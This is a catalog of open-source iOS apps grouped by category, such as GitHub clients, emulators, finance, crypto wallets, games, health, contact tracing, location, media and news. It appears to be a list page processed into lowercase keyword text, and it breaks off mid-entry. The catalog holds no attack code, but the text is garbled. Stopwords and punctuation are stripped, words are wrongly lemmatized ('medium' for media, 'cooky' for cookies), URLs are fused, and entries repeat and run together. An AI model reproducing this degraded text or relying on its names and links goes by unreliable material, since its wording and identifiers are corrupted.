actually useful swift added december screenshot screenshot savanna ide writing cub script swift added august license screenshot screenshot screenshot screenshot terrarium ui prototyping coder c added february license mit screenshot tldr man page reference dictionary computer manual command tl dr long nt read mode swift added may license tl inspector verify secure connection information website ensure information private app store c objc c added may license screenshot screenshot screenshot unwrap learn swift interactively iphone http wwwhackingwithswiftcom swift http wwwhackingwithswiftcom added august license screenshot screenshot screenshot screenshot wwdcast unofficial wwdc application watch wwdc video session chromecast swift rxswift mvvm added june license mit screenshot screenshot screenshot zeplin preview design zeplin app store swift added april license screenshot Ëä±ÁÅ∞ prounounce programming term english swift http added march license screenshot github back top codehub browse maintain github repository app store csharp http codehubappcom added june license screenshot screenshot screenshot screenshot screenshot contribution github look github contribution graph today extension app store objc added october license screenshot evolution unofficial app swift evolution app store swift swiftevolution added april license mit screenshot screenshot screenshot screenshot screenshot githawk github project manager app store swift iglistkit snapkit alamofire added july license screenshot screenshot githubswift swift added may license mit githubsearch github client written using mvvm without rx interface builder swift router realm added april license mit screenshot gitify brings github notification pocket reactnative added july license mit screenshot gitiny explore trending github swift rxswift mvvmc cleanarchitecture added may license mit screenshot screenshot screenshot screenshot gitpoint github app minimal beautiful ui app store reactnative added july license mit screenshot screenshot igit us gitupkit clone github repo perform commit objc added may license monkey browse top github coder repository app store objc added august license mit screenshot screenshot screenshot screenshot screenshot mrcode github cache markdown content objc iphone added november license mit screenshot octopodium list user ranked github repository star count swift added february license screenshot screenshot screenshot screenshot pocket trailer manage pull request issue github github enterprise app store swift added october license mit screenshot screenshot screenshot screenshot screenshot rkgist github gist objc restkit added april license screenshot screenshot siesta github browser browse star github repository swift rest added july license mit screenshot screenshot swifthub github client written rxswift mvvm clean architecture swift rxswift mvvm moya fastlane added september license mit screenshot screenshot screenshot terminal back top education back top ciao game learn new language people respond well repetition includes italian french chinese german polish portuguese russian spanish swift added april license screenshot screenshot screenshot conjugar learn practice spanish verb tense app store swift added march license mit screenshot screenshot screenshot screenshot screenshot delta math helper quickly solve math problem algorithm save time checking homework studying test app store swift macos ipad added april license screenshot screenshot screenshot screenshot discussit scholarly article search discussion forum discussion board swift firebase swiftyjson added may license mit screenshot fingerspelling practice american sign language asl fingerspelling app store swift swiftui combine added april license mit screenshot go flashcard create stack flashcard review ipad iphone apple watch swift realm watchos cloudkit spotlight added february license screenshot screenshot screenshot screenshot screenshot gradecalc gpa calculator keep track gpa app store swift added june license screenshot screenshot screenshot igrades track class grade app store objc added march license screenshot screenshot screenshot screenshot screenshot kotoba quickly search builtin dictionary see definition word collect word want remember swift added august license mit screenshot screenshot screenshot screenshot first memory memory game includes introduction io swift swift instagram api added july license screenshot screenshot pocket code create game animation interactive music video many kind apps directly device app store swift objc http wwwcatrobatorg added march license population clock learn geography demographic app store objc added march license screenshot prayer english help understand spoken text islamic prayer app store swift added april license screenshot screenshot screenshot recast podcast client seek transform way listen interact share discover podcasts swift added may license mit screenshot screenshot screenshot screenshot stepik take open course http stepikorg app store swift ipad alamofire swiftyjson sdwebimage devicekit promisekit swiftlint added may license screenshot transcription helper player assisting transcription app store objc http novinfardcom added may license mit screenshot screenshot screenshot screenshot ulangi learn language using popular method spaced repetition app store reactnative added january screenshot screenshot screenshot screenshot screenshot screenshot screenshot wanikani learn kanji http wwwwanikanicom app store swift added may license screenshot screenshot screenshot screenshot wwdcast unofficial wwdc application watch wwdc video session chromecast swift rxswift mvvm added june license mit screenshot screenshot screenshot emulator back top activegs apple iiiigs emulator inapp game browser mfi icade controller support objc added may license screenshot dospad dosbox objc added may license screenshot gameboy gameboy color gameboy advance emulator objc added november license screenshot iamiga iuae commodore amiga emulator based uae objc added may license screenshot screenshot ish linux shell io c objc http ishapp added march license screenshot screenshot mame frontend objc added may license screenshot mini vmac early macintosh emulator objc http namedforknetminivmac added july license screenshot nintendo d emulator port desmume objc added may license screenshot ppsspp psp emulator c added may license screenshot screenshot screenshot provenance emulator frontend sega genesis snes ne gbgbc realm added april license screenshot screenshot retroarch comprehensive emulator frontend support ne snes gameboy sega master system genesis playstation atari lynx c added may license screenshot event back top eventblankapp template event conference swift iphone added april license mit screenshot official app react native added april license screenshot iosdcrc iosdc reject conference swift twitter added april license meetuporganizer extends meetup app functionality swift alamofire oauthswift added january license screenshot nortal techday react native added may license mit screenshot screenshot northern california cherry blossom festival app store swift http sfcherryblossomorg added may license screenshot open event organizer event management app organizer using open event platform swift alamofire swiftlint objectmapper added april license mit openstack foundation summit app store swift added march screenshot party wwdc swift cloudkit added january license mit screenshot screenshot rwdevcon app store swift added march license screenshot screenshot screenshot try swift nyc swift toucan realm added november license screenshot screenshot try swift tokyo swift timepiece realm kingfisher acknowlist added february license screenshot screenshot wwdc family io easily connect fellow developer wwdc swift added february license screenshot wwdc family react native easily connect fellow developer wwdc reactnative added april license screenshot extension back top content blocking back top today today extension widget back top bus today track bus line wrist includes today extension app store objc added february license screenshot screenshot screenshot screenshot screenshot contribution github look github contribution graph today extension app store objc added october license screenshot daylight know much sun today swift carthage added july license screenshot fojusi work timer today extension app store swift added june license mit screenshot screenshot screenshot github contribution widget app store swift firebase alamofire swiftyjson added may license screenshot lunarcore small lunar calendar today extension objc added october license mit screenshot news api apps news app style nyt cnn bbc reddit twitter facebook includes tvos app today widget swift tvos extension added april license mit screenshot screenshot screenshot openit launch apps objc added june license screenshot timeline know friend colleague family swift http timelinesapp added april license screenshot vpn extension turn vpn app store swift added march license mit screenshot file file management back top amahi view doc photo video data stored amahi server securely anywhere app store swift ipad added august license cozy drive store manage share file photo document securely cloud free storage app store javascript cordova http cozyioen added february license screenshot screenshot screenshot screenshot fileexplorer powerful file browser allows user choose remove file andor directory swift added january license mit screenshot nextcloud safe home data app store objc http nextcloudcom added april license screenshot screenshot screenshot screenshot owncloud file browser sync owncloud file hosting service app store swift ipad added may license screenshot seafile pro app seafile selfhosted file sharing app store objc http wwwseafilecomenhome added june license screenshot screenshot screenshot screenshot finance back top argent payment swift added july license mit screenshot boardbank money manager board game app store swift http wwwrichardneitzkecom added march license mit screenshot screenshot buck tracker expense tracker swift added november license divrise elegant dividend yield income tracker swiftui dividend income tracker added june license mit screenshot screenshot screenshot econoapp keep track economic information swift added june screenshot screenshot screenshot emi calculator calculate equated monthly installment emi home car personal loan app store swift viper added july license mit screenshot encryptr zeroknowledge cloudbased ewallet password manager app store cordova grunt node http spideroakcomencryptr added june license screenshot screenshot screenshot screenshot screenshot exchanger exchange currency multiply wallet ecb exchange rate viper objc coredata added december license mit screenshot gasoline track gas expense swift swiftlint quick nimble added may license moneyplus help record income expense swift added may screenshot stock basic stock tracking support finnhub tiingo iex cloud swift added june license mit screenshot neverlate payifurlate geofences objc venmo api added may license screenshot sip calculator calculate future value sip systematic investment plan payment app store swift added july license mit screenshot smart wallet managing money budget app store swift http novinfardcom added may license mit screenshot screenshot screenshot screenshot screenshot tip calculator calculate tip split bill number people app store viper added august license mit screenshot tothepenny budget tracker objc added april license mit screenshot screenshot screenshot screenshot cryptocurrency back top alphawallet eth wallet easytouse secure ethereum wallet app store swift http alphawalletcom added november license screenshot screenshot screenshot bither simple secure bitcoin wallet objc added april license screenshot screenshot screenshot screenshot bitprice display monitor current bitcoint rate app store swift added february license mit screenshot screenshot bread bitcoin wallet app store swift added july license mit screenshot essentia multi wallet one blockchain solution app store swift added march license screenshot exa wallet monero receive spend store monero multisignature wallet app store swift http walletexantech added november license screenshot screenshot trust ethereum wallet dapp browser app store swift http trustwalletcom added march license screenshot unstoppable wallet fully decentralized bitcoin ethereum eos binance chain bitcoin cash dash currency wallet app store swift added august license mit screenshot wei wallet ethereum wallet swift swinject license screenshot game back top objc added march license mit screenshot swift added march license mit screenshot spritekit objc added july license mit screenshot swiftui written swiftui swift swiftui added march license mit screenshot aeropack steampunk retro platformer objc added may license screenshot arbusters augmented reality game pixelbillboard style swift added april license mit screenshot associationbot game chatbot word association image recognition ai machinelearning naturallanguageprocessing neuralnetwork added june license screenshot screenshot canabalt infinite runner app store objc added march license screenshot screenshot screenshot screenshot screenshot cardsagainst card humanity swift added january license mit screenshot castle hassle realtime physical game build kingdom crushing opponent objc added may license mit codecombat multiplayer programming game learning code objc added january license mit screenshot concentration game ÁøªÁøªÁúã swift added may license screenshot conway game life vie app store objc added july license mit screenshot screenshot screenshot screenshot cookiecrunch candy crush clone swift added may license mit doom classic app store objc added may license screenshot screenshot screenshot doom classic app store objc added may license screenshot screenshot screenshot screenshot screenshot dragon shout app social journal elder series objc added june license dropcolour drag drop one circle onto another color app store swift added july license mit screenshot screenshot screenshot screenshot screenshot dungeon crawl game dungeon exploration combat magic involving character diverse skill objc http githubcomcliffsdovercrawltreeiosrelease added march license screenshot fityit challenging shape game skill reflex swift spritekit game animation added may license mit screenshot screenshot screenshot screenshot screenshot flappy flybird clone flappy bird using spritekit gameplaykit swift spritekit gameplaykit added july license screenshot screenshot screenshot screenshot screenshot flappy royale lastbirdflapping battle royale swift added august license screenshot flappybird clone scary flight objc added may license mit screenshot screenshot flappyswift flappy bird clone swift added march license mit screenshot frogatto friend actionadventure game starring certain quixotic frog objc http frogattocom added october license screenshot frotz play hundred free work interactive fiction text adventure game app store objc http githubcomifrotziosfrotzblobwikifrotzmainmd added june license screenshot screenshot screenshot screenshot game war clone strategy game objc helpshift ssziparchive added july license screenshot gravity block basic physic concept gravity elasticity swift added august license green mahjong solitaire mahjong javascript netbeans added october license screenshot screenshot screenshot screenshot screenshot hedgewars turnbased strategy game app store objc http wwwhedgewarsorg added june license screenshot screenshot screenshot screenshot screenshot hostile takeover release realtime strategy game warfare incorporated objc added june license screenshot legendwings everwing game clone survive much earn gold upgradepurchase new character swift spritekit added april license screenshot screenshot screenshot screenshot littlego game go app store iphone ipad added march license screenshot lumines remake c added june license master pok√©monlike game us location objc added may license mit matchimalsfun animal matching puzzle card game app store reactnative ipad added november license mit screenshot screenshot screenshot screenshot mechahamster roll customizable environment share friend csharp firebase added may license screenshot memory game memory game using viper robust unit test fastlane swift added july license mit screenshot moonlight game streaming app store c ipad added may license screenshot mudrammer mud multiuser dungeon app store objc iphone ipad added june license mit screenshot screenshot screenshot first memory memory game includes introduction io swift swift instagram api added july license screenshot screenshot neocom eve online eveonline mmorg character management tool app store objc added june license screenshot screenshot screenshot screenshot screenshot octopus remake nintendo octopus game watch device swift added may license screenshot oh plane game like flappy bird app store swift spritekit gameplaykit added april license mit screenshot screenshot pizzaman play devilishly difficult diversion app store swift ipad added july license screenshot ragnarok simple game folk learning swift swift added september license mit screenshot screenshot screenshot scpasylumfail game like life line swift added october license screenshot screenshot sansumoku board game mashup sudoku ultimate tictactoe app store swift http wwwsansumokucom added september license screenshot savethedot escape square swift uiviewpropertyanimator added june license mit screenshot sf symbol game simple game help get familar name amazing sf symbol apple app store swift added april license mit screenshot shmup multiplatform game written primarily c app store objc http fabiensanglardnetshmup added july license screenshot screenshot screenshot skeleton key puzzle game must shift key around board unlock treasure chest objc added may license mit spare part simple point line physic using verlet integration app store objc added april license screenshot teh internet pilot rolfcopter collect lolcats dodge popups feed troll cheezburgers sidescrolling arcade shooter objc added june license screenshot tic tai toe tic tac toe ai pro app store swift added july license screenshot screenshot screenshot ultimate peg solitaire famous puzzle game app store swift http wwwultimatepegsolitairecom added january license screenshot wolfenstein wolfenstein io app store objc added may license screenshot screenshot http back top spritekit http developerapplecomreferencespritekit back top spritekit objc added july license mit screenshot crossesnous class tic tac toe reincarnation ai state machine swift gameplaykit added august license screenshot fityit challenging shape game skill reflex swift spritekit game animation added may license mit screenshot screenshot screenshot screenshot screenshot five row ‰∫îÂ≠êÊ£ã objc added may license mit screenshot flappy flybird clone flappy bird using spritekit gameplaykit swift spritekit gameplaykit added july license screenshot screenshot screenshot screenshot screenshot gamejam contains game made game jam swift spritekit added august license mit screenshot screenshot screenshot screenshot mergel shape matching puzzle swift added november license mit screenshot oh plane game like flappy bird app store swift spritekit gameplaykit added april license mit screenshot screenshot sakura fly app store objc added march license mit screenshot snake classic snake engine apple device swift added august license mit screenshot stickheroswift swift iphone ipad added june license mit screenshot swiftsnake snake clone swift added august license screenshot health back top arex reminder taking medication swift carthage pistachio reactivecocoa added june license mit corona tracker coronavirus tracker map chart swift http coronatrackersamaboxcom added march license screenshot corona virus tracker dart added april license mit screenshot screenshot corona virus tracker advice swift swiftui added march license mit screenshot coronavirus iran swift reactnative typescript added april license screenshot coronavirustrackerflutter flutter dart added april license mit screenshot swiftui demo data news swift swiftui combine added april license screenshot health data news tweet swift added april license mit screenshot screenshot screenshot covidcheck track case beautiful easytouse interface swift added march license screenshot depressed test depressed app store swift added january license mit screenshot screenshot screenshot screenshot gleam use machine learning help make early diagnosis melanoma get necessary treatment time swift coreml avkit viper added january license mit screenshot glucosio diabetes management research swift objc healthkit realm added january license good spirit drink tracker weekly limit support untappd support healthkit app store swift healthkit added september license screenshot screenshot screenshot healthkitswift sample app swift healthkit added october license screenshot screenshot screenshot screenshot hidrate interacts smart water bottle objc added may license screenshot screenshot screenshot screenshot medkeeper track medication take swift added september license screenshot myweight history body mass tracker easy data input access history app store swift added june license mit screenshot nightguard display blood glucose value stored nightscout server swift applewatch http wwwnightscoutinfo added june license screenshot screenshot screenshot screenshot screenshot open food fact scan food product barcode see good planet app store swift added june license screenshot suicide safety plan suicide prevention app store objc added march license mit screenshot contact tracing back top australia covidsafe app store swift alamofire keychainswift lottie added may license screenshot austria stopp corona keep track encounter friend family coworkers save anonymously app store swift swiftlint moya swiftybeaver firebase sqlite lottie added april license screenshot bulgaria virusafe share symptom well track spread interactive map app store swift added june license screenshot canada covid alert app store reactnative added august license mit screenshot czech republic erou≈°ka app store swift rxswift bluetooth http erouskacz added april license mit screenshot france stopcovid app store swift http wwweconomiegouvfrstopcovid added may license screenshot germany corona warn app us apple exposure notification framework app store swift added may license screenshot haiti guam puerto rico wyoming pathcheck safeplaces exposure notification contract tracing app store reactnative added august license mit screenshot iceland help analyse individual travel trace movement case infection arise app store reactnative http wwwcovidisappis added april license mit screenshot israel hamagen exposure prevention app app store reactnative added april license mit screenshot italy immuni app store swift alamofire katana tempura bonmot http wwwcovidisappis added june license screenshot netherlands notification swift added july license poland protego safe user daily triage contact tracing using exposure notification api app store swift added june license screenshot slovenia covid world help fight spread collecting anonymous data people meeting swift added august license mit switzerland swisscovid tracing using decentralised privacypreserving proximity tracing app store swift added may license screenshot contact tracing reference back top exposurenotificationapp inform people may exposed using apple exposurenotification framework swift added may license screenshot opencovidtrace us opensource framework exposure tracing swift added may license traceprivately us apple privacypreserving exposurenotification framework swift added april license screenshot fitness back top researchkit http wwwapplecomresearchkit back top home back top location back top aircheck check air pollution map swift mapbox pop swiftyjson alamofire added november license screenshot arc learns place visit like move around app store swift added june license screenshot bike compass city bicycle finder swift carthage alamofire added june license mit screenshot cepp find information address swift afnetworking added november license screenshot screenshot crimemapper look crime data uk swift http samwoolfnet added april license mit screenshot screenshot screenshot screenshot screenshot eatnow get recommendation restaurant nearby app store objc added october license mit screenshot screenshot screenshot screenshot emission track travel mode travel carbon footprint compare user app store javascript phonegap cordova ionic http emissioneecsberkeleyedu home added april license screenshot find bus nj track nj transit bus time swift added july license screenshot geolicious location tracking made easy app store objc added march license mit screenshot screenshot screenshot screenshot geotappy share location objc added april license screenshot screenshot gps stone record position export trip gpx gps stone objc added june license grove crowdsourced hammock location swift alamofire realm swiftybeaver kingfisher asyncswift added october license screenshot hopperbus timetable university nottingham hopper bus swift added january license screenshot screenshot screenshot screenshot ipokego map pokemon around app store objc ipad added january license mit screenshot landmark discover share place love swift swiftui mapkit added june license screenshot mapsme offline map navigation app store openstreetmap api http mapsme added may license screenshot screenshot screenshot screenshot screenshot miataru location tracking data shared public private server app store objc http miatarucomios added june license screenshot screenshot screenshot screenshot move visualize spend time objc added july license mit screenshot neverlate payifurlate geofences objc venmo api added may license screenshot onebusaway realtime arrival schedule information public transit seattle atlanta tampa app store objc added august license screenshot screenshot screenshot screenshot screenshot openstreetview collect openstreetview data app store objc added august license screenshot screenshot screenshot screenshot screenshot osmand map map access openstreetmaps app store objc http osmandnet added june license screenshot screenshot screenshot owntracks keep track location build private location diary share family friend app store cocoalumberjack added april license screenshot parkendd check status several public parking lot germany switzerland app store swift added april license mit screenshot screenshot pebciti pebble show nearest citibike nyc dock objc added may license mit screenshot prey track lost stolen device perform action remotely app store objc http preyprojectcom added june license screenshot screenshot screenshot screenshot screenshot prey track lost stolen device perform action remotely swift http preyprojectcom added june license sit ÈõïÂàªÊó∂ÂÖâ app chinese cafe chain diaokeshiguang sit coffee app store objc added april license mit screenshot santa tracker swift realm added may license screenshot startup mapped israel discover new startup locate coworking space objc added april license mit screenshot screenshot screenshot screenshot tpg offline navigate geneva public transport swift carthage alamofire locationmanager added october license mit screenshot traccar client report device location server app store objc added july license screenshot traccar manager track gps device map app store objc added july license screenshot screenshot screenshot wheelmap map locate wheelchairaccessible place app store objc http wheelmaporg added june license screenshot screenshot screenshot medium image video audio reading back top ascii art generator swift added may license mit screenshot comicflow comic reader app store ipad added august license screenshot facemotion find contact face recognition opencv added july license mit screenshot filterpedia core image filter explorer swift coreimage added january license screenshot inkpad vector illustration objc added june license screenshot screenshot screenshot screenshot screenshot kodi popular medium player entertainment hub objc http kodiwikiviewios added june license screenshot kodi remote official kodi remote app store objc http koditv added june license screenshot screenshot screenshot screenshot screenshot marvel comic swift moya rxswift dollar kingfisher quick nimble added january license mit screenshot meme maker create share meme swift added june license screenshot screenshot screenshot screenshot screenshot mupdf pdf xpsopenxps cbz epub document viewer app store objc http mupdfcom added june license screenshot screenshot screenshot myanimelist swift vip realm added august license mit pdf keynote import pdf presentation vector image keynote app store swift added june license mit screenshot pictograph hide message image steganography app store swift added june license mit screenshot screenshot screenshot selfie stick sync device use one remote control camera app store objc added february license screenshot screenshot swiftspace gyroscope driven drawing space swift coremotion added september license screenshot transcription helper player assisting transcription app store objc http novinfardcom added may license mit screenshot screenshot screenshot screenshot upcoming tv track favorite tv show air next swift added june license mit screenshot wallabag selfhosted readitlater app app store swift added february license mit screenshot screenshot animoji back top audio back top analog synth x simple analog synthesizer music keyboard example swift http audiokitioexamplesanalogsynthx added february license mit screenshot audiokit rom player make sample music instrument app store swift ipad http audiokitprocomromplayercode added december license mit screenshot audiokitsynthone free synthesizer http audiokitprocomsynth app store swift objc http audiokitprocomsynth added july license mit screenshot bookplayer player drmfree audiobooks app store swift added july license screenshot screenshot screenshot concertino classical music apple music working together app store swift added july license screenshot doubanfm afnetworking mpmovieplayer iphone added october license mit screenshot formant plotter user speaks formant plotted screen app store swift ipad added july license mit screenshot miamisunglasses play first five second csi miami theme song onthego meme creation yeaaaaaaaaaahh swift added may license screenshot monotone delay simple synthesiser based korg monotron delay app store objc http monotonejustuskandzicom added december license mit screenshot newsanalyzer let listen english news see text let analyze heard swift alamofire added may license mit screenshot podcasts clone apple podcasts swift rxswift added april license mit screenshot screenshot screenshot screenshot screenshot screenshot podverse featurerich crossplatform podcast app focus clip sharing discovery app store reactnative http podversefm added april license screenshot screenshot screenshot screenshot prodigal music player app store swift snapkit haneke koloda added may license screenshot screenshot screenshot screenshot queue music realtime votable democratized music queue ipad iphone using spotify swift http wwwqueuedappcom added april license screenshot screenshot screenshot radio paradise official app http wwwradioparadisecom app store objc http wwwiltofacomrphd added june license mit screenshot swift radio pro professional radio station swift added january license mit screenshot voicememos audio recorder swift added april license mit screenshot youtag music player downloads internet even youtube swift added may license mit screenshot content back top artshredder banksy shredder swift arkit banksy http martysuzukigithubioartshredder added december license mit screenshot screenshot artsy art world pocket app store iphone ipad reactnative typescript added january license mit screenshot artsy folio artwork showcase app store objc added august license mit screenshot screenshot screenshot screenshot bar cocktail menu swift added january license screenshot screenshot screenshot screenshot bringmyownbeer beer browser swift rxswift kingfisher added june license screenshot dunk swift dribbble added december license mit screenshot fastmdb fast app browse search movie tv people credit swift tmdb added may license mit screenshot ghibliii studio ghibli movie database swift added august license screenshot screenshot homepok catalog ukrainian vehicle plate swift added november license mit screenshot irisios explore artwork deviantartcom swift deviantart masonry added august license screenshot screenshot screenshot kiwix offline reader wikipedia many website app store swift http wikikiwixorgwikimainpage added june license screenshot screenshot screenshot screenshot screenshot konabot http konachannet app store swift added december license screenshot screenshot screenshot screenshot screenshot library genesis preview download book library genesis http libgenis swift added march license mit screenshot screenshot screenshot lidderbuchapp songbook luxembourgish student app store swift added september license mit screenshot screenshot screenshot screenshot molecule visualize molecule app store objc added may license screenshot screenshot screenshot movieapp discover movie tv show react native tmdb added november license mit screenshot moviedict offline dictionary international movie title app store wikipedia http moviedictinfo added july license mit screenshot movie afnetworking sdwebimage tmdb added february license mit screenshot movieswiftui browse movie made swiftui combine moviedb swift swiftui themoviedb combine ipad macos added june license screenshot osia super basic app browse opensourceiosapps swift added july license mit screenshot osrsui old school runescape database browser swift swiftui combine added march license papersswiftui unsplash swift added june license screenshot papr unofficial client http unsplashcom swift added april license screenshot screenshot phishod listen song phishin view concert rating review phishnet app store objc added june license screenshot screenshot screenshot screenshot screenshot photobrowser simple instagram photo browser swift instagram api added march license screenshot screenshot phphub app http learnkucomlaravel iphone ipad added december license mit popcorntime play movie swift added may license screenshot screenshot screenshot popular movie crossplatform app discovering recent popular movie swift realm alamofire tmdb added january license mit screenshot screenshot reading list track personal reading list app store swift iphone ipad coredata added july license mit realmvideo watch realm video slide swift iphone added may license mit screenshot revill browse search game swift swiftui combine added july license mit screenshot showio simple tv show tracker app store swift tmdb http madyanovcomshowioen added march license mit screenshot screenshot screenshot soundcloudswift soundcloud swift added may license mit screenshot swiftuimoviedb browse movie made swiftui combine moviedb swift swiftui themoviedb ipad added april license mit screenshot tvtoday swift rxswift realm mvvm tmdb added august license screenshot word thesaurus objc added january license mit screenshot wwdc student wwdc scholarship entry swift added march license screenshot screenshot xkcd app store iphone added june license mit screenshot screenshot screenshot screenshot xkcd open source xkcd comic reader app store objc added june license mit screenshot screenshot screenshot screenshot gif mostly using http giphycom back top photo back top artshredder banksy shredder swift arkit banksy http martysuzukigithubioartshredder added december license mit screenshot screenshot blear transform photo stunning blurry wallpaper device app store objc added february license mit screenshot screenshot screenshot colorblur add blur photo app store objc added march license screenshot screenshot screenshot screenshot emotionnote diary choose take photo face reveal emotion swift added april license mit screenshot frame grabber extract video live photo frame image app store swift added september license mit screenshot screenshot screenshot screenshot iosdepthsampler code example depth apis swift added september license mit screenshot screenshot screenshot screenshot kontax cam instant camera hybrid photographer photographer swift metal added august license screenshot megabite turn photo food face opencv pop added february license screenshot metax check edit delete metadata photo app store swift added may license mit screenshot screenshot phimpme photo app replacement swift added august license mit screenshot pixpic photo editing swift added july license screenshot screenshotter organize manage screenshots app store iphone added july license screenshot seefood detect various dish using camera swift coreml added september license screenshot sharedimages save image cloud storage eg google drive safely share image others swift google drive api facebook api syncserverii client added november license mit screenshot tagger help tag photo instagram flickr swift added july license mit screenshot triggy intervalometer wifienabled canon dslrs app store swift added may license screenshot upupu simple camera backup picture app store webdav dropbox added april license screenshot screenshot screenshot vk photo image gallery social network vkcom swift flux rxswift added october license screenshot screenshot screenshot weare augmented reality album app store swift arkit added december screenshot screenshot screenshot screenshot video back top news back top beam enjoy reddit content unique beautiful package app store swift objc added may license screenshot screenshot screenshot designer news browse http wwwdesignernewsco design technology site swift added march license screenshot lobsterapp browse http lobster community news site objc added july license screenshot lobstersreader swift added june license mit screenshot objc added november license mit screenshot reddift reddit browser search comment swift added may license mit screenshot redditswiftui crossplatform reddit client swift swiftui macos watchos added april license mit screenshot slide reddit powerful new way reddit app store swift added august license screenshot screenshot screenshot screenshot swipeit reddit swipe swift rxswift moya kingfisher snapkit added may license mit tabdump tabdump news afnetworking added january license mit screenshot oakland post oakland university studentrun newspaper rochester michigan swift added march license browse http startup designer developer site objc added april license mit screenshot screenshot screenshot screenshot screenshot zeitsuche search article published germany zeit newspaper swift iphone added june license mit screenshot hacker news http newsycombinatorcom back top news api http newsapiorg back top swiftui demo data news swift swiftui combine added april license screenshot health data news tweet swift added april license mit screenshot screenshot screenshot dailyfeed swift added january license mit screenshot dailynews swift mvvm rxswift sdwebimage added april license mit screenshot fancynews swift kingfisher alamofire added april license mit screenshot flutter news app flutter dart added april license screenshot livenewsviper news app using viper swift added august license screenshot news discover read news range news sourcesblogs objc added november license mit screenshot screenshot screenshot news api apps news app style nyt cnn bbc reddit twitter facebook includes tvos app today widget swift tvos extension added april license mit screenshot screenshot screenshot newsapiapp news app image caching infinite loading swift added june license screenshot newsapiswift swift added april license mit screenshot newsappwithswiftuiandcombine swift swiftui combine added april license mit screenshot newsline flutter dart added may license screenshot royal news reactnative added april license mit screenshot r back top official back top chrome objectivec http added february license screenshot screenshot screenshot coding official coding app reactivecocoa masonry added september license mit screenshot screenshot screenshot screenshot screenshot duckduckgo official duckduckgo app app store afnetworking added march license screenshot screenshot screenshot screenshot screenshot official app react native added april license screenshot firefox official firefox app app store swift carthage alamofire snapkit libphonenumber added january license screenshot screenshot screenshot screenshot screenshot ghostery privacy browser private fast tracker adfree mobile browsing app store swift http wwwghosterycommobile added august license screenshot kickstarter independent creator passionate backer come together bring new idea life app store swift alamorefire stripe iossnapshottestcase added december license screenshot screenshot screenshot screenshot kodi popular medium player entertainment hub objc http kodiwikiviewios added june license screenshot kodi remote official kodi remote app store objc http koditv added june license screenshot screenshot screenshot screenshot screenshot nextcloud safe home data app store objc http nextcloudcom added april license screenshot screenshot screenshot screenshot nextcloud talk video audio call nextcloud app store objc http nextcloudcom added april license screenshot screenshot screenshot screenshot northern california cherry blossom festival app store swift http sfcherryblossomorg added may license screenshot osia super basic app browse opensourceiosapps swift added july license mit screenshot radio paradise official app http wwwradioparadisecom app store objc http wwwiltofacomrphd added june license mit screenshot scholar wwdc official app recipient apple wwdc scholarship swift added july license mit screenshot screenshot screenshot screenshot simplenote keep note list idea sync cloud includes sharing note collaboration app store fabric crashlytics http simplenotecom added august license screenshot vlc medium player app store objc http wwwvideolanorg added march license screenshot screenshot screenshot wikipedia official wikipedia app app store swift added january license mit screenshot screenshot screenshot screenshot screenshot screenshot wire modern private communication crystal clear voice video group chat always encrypted app store swift carthage afnetworking purelayout added july license screenshot wordpress official wordpress app app store swift added march license screenshot reactive programming back top reactivecocoa http githubcomreactivecocoareactivecocoa back top arex reminder taking medication swift carthage pistachio reactivecocoa added june license mit brewmobile app managing beer brewing process swift added september license screenshot screenshot simple timer make developing film easier reliable objc added january license mit coding official coding app reactivecocoa masonry added september license mit screenshot screenshot screenshot screenshot screenshot giraffe swift reactivecocoa added september license mit screenshot reactiveswiftflickrsearch photo search swift mvvm flickr api added february license screenshot simpleauth simple authentication oauth twitter facebook instagram tumblr objc added april license mit screenshot tropos weather app store dark sky api forecast api reactivecocoa added june license mit screenshot screenshot rxswift http githubcomreactivexrxswift back top baby monitor swift swiftlint realm swiftybeaver added april license count dead simple way count anything swift added july license mit screenshot screenshot screenshot screenshot drrrible app store swift dribbble reactorkit moya kingfisher added may license mit screenshot screenshot screenshot github api client swift mvvm rxswift added march license mit screenshot gitiny explore trending github swift rxswift mvvmc cleanarchitecture added may license mit screenshot screenshot screenshot screenshot kiosk artsy auction swift rxswift added january license mit screenshot papr unofficial client http unsplashcom swift added april license screenshot screenshot podcasts clone apple podcasts swift rxswift added april license mit screenshot screenshot screenshot screenshot screenshot screenshot rxcurrency currency converter reactivex swift added february license mit screenshot rxmarbles interactive diagram rx observables app store swift added june license screenshot screenshot screenshot rxswift mvvm example using github search swift rxswift added july license rxtodo swift rxswift mvvm added september license screenshot spotifyradar never miss new release favorite spotify artist swift iphone ipad spotify spotifyradar rxswift coordinator mvvm added june license mit screenshot swifthub github client written rxswift mvvm clean architecture swift rxswift mvvm moya fastlane added september license mit screenshot screenshot screenshot tweetometer see tweeting timeline swift added may license mit screenshot wwdcast unofficial wwdc application watch wwdc video session chromecast swift rxswift mvvm added june license mit screenshot screenshot screenshot sample back top day react native demo react native added august license mit screenshot mini swift apps selfstudy swift added april license apple developer library objc added march license apple wwdc code sample wwdc objc added july license arkit example placing object swift arkit added april license artist use relay access artsy graphql api react native graphql added february license mit screenshot cannonball fun way create share story poem app store swift added march license screenshot screenshot screenshot screenshot castvideos sender app used starting google cast swift added july license cleanstore us clean swift architecture uncle bob clean architecture swift added april license mit cloudkit cloudkit added may license mit screenshot cloudkit swift cloudkit added may license mit screenshot compositionallayoutskit set advanced compositional layout uicollectionview example swift io swift added may license mit screenshot contactsmvpswift us mvp model view presenter pattern swift mvp contact added october license mit screenshot screenshot face landmark detection find facial feature face contour eye mouth nose image swift vision added january license screenshot grdbcombine set extension sqlite grdbswift combine swift combine added august license mit screenshot iosdesignpatternsamples github user search app variety design pattern swift mvc mvp mvvm flux designpatterns added january license mit screenshot screenshot iosswiftmetalcamera example app showing use avcapturesession metal swift swift metal added february license screenshot screenshot knock use accelerometer background mode create feature knocking phone objc added march license mit screenshot layerparse swift parse atlas added january license screenshot layerplayer explore capability apple core animation api app store swift added march license mit screenshot screenshot live live broadcasting swift added august license screenshot screenshot mvctodo simple app illustrate principle better mvc talk swift added november license poll app poll api apiary swift added june license mit screenshot protocoloriented mvvm example swift mvvm added september license mit screenshot screenshot screenshot recording sample code app architecture book swift http wwwobjciobooksapparchitecture added april license reminder application demonstrate implement clean architecture swift added february license mit screenshot screenshot restaurant viewing swift alamofire moya corelocation added april license screenshot rkgist github gist objc restkit added april license screenshot screenshot safariautologintest demo autologin user using safari cooky swift http added april license screenshot siesta github browser browse star github repository swift rest added july license mit screenshot screenshot siri shortcut example example project siri shortcut handoff io swift added december license screenshot snowflake reactnative starter appboilerplateexample redux rn router jest snowflake hapi server running locally redhat openshift backend parse server running locally remotely heroku reactnative redux added february license mit screenshot staterestorationdemo state preservation restoration apis swift added january license screenshot swiftdemos mirror 